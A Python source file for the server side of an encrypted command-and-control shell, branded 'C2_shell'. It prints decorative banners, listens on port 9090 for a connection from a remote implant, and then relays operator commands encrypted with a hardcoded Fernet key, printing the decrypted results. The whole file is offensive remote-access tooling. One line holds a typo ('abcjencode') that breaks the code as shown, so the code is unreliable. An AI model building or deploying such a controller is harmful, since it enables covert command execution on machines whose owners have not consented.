import socket
from cryptography.fernet import Fernet
import random
banner = """

  ______  ___                _______. __    __   _______  __       __      
 /      ||__ \              /       ||  |  |  | |   ____||  |     |  |     
|  ,----'   ) |            |   (----`|  |__|  | |  |__   |  |     |  |     
|  |       / /              \   \    |   __   | |   __|  |  |     |  |     
|  `----. / /_          .----)   |   |  |  |  | |  |____ |  `----.|  `----.
 \______||____|  ______ |_______/    |__|  |__| |_______||_______||_______|
                |______|                                                    GITHUB:-https://github.com/raghu14321
"""
banner1 = """
              ooooooo                             oooo                    o888  o888  
  ooooooo   o88     888                oooooooo8   888ooooo    ooooooooo8  888   888  
888     888       o888                888ooooooo   888   888  888oooooo8   888   888  
888            o888   o                       888  888   888  888          888   888  
  88ooo888  o8888oooo88               88oooooo88  o888o o888o   88oooo888 o888o o888o  GITHUB:-https://github.com/raghu14321
                         oooooooooooo                                                 """
banner2 = """
         
c2  shell
  ==       GITHUB:-https://github.com/raghu14321 

"""
banner3 = """
        2222                 hh             lll lll 
  cccc 222222           sss  hh        eee  lll lll 
cc         222         s     hhhhhh  ee   e lll lll 
cc      2222            sss  hh   hh eeeee  lll lll 
 ccccc 2222222 _______     s hh   hh  eeeee lll lll   GITHUB:-https://github.com/raghu14321
                        sss                             
"""
ran = random.randint(1,4)
if ran == 1:
    print(banner)
elif ran == 2:
    print(banner1)
elif ran == 3:
    print(banner2)
elif ran == 4:
    print(banner3)
else:
    exit()
key = b'6SD4hKWjhtCa4SeeoVCXXWbGwQgDBxTJm3Egz25A2b8='
f = Fernet(key)
listner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listner.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listner.bind(("0.0.0.0", 9090))
listner.listen(0)
print("[+] Waiting for incoming connection\n")
connection,host = listner.accept()
print("--help \n to quit use (q0ut)")
rec = connection.recv(40960).decode()
print("[+] Got a connection form this ", host)
test1 = f.decrypt(rec)
test2 = str(test1)
test3 = (test2[2:-1])
print(test3)
#print("[+] Got a connection form this ", host)
def encrypter():
    abc = input("enter command:-")
    byte = abcjencode("utf-8")
    message = f.encrypt(byte)
    return message
def recieve():
    const = connection.recv(40960).decode()
    const1 = const.encode("utf-8")
    const2 = f.decrypt(const1)
    const3 = str(const2)
    const4 = (const3[2:-1])
    return const4

while True:
    ping = encrypter()
    connection.send(ping)
    get = recieve()
    print(get)
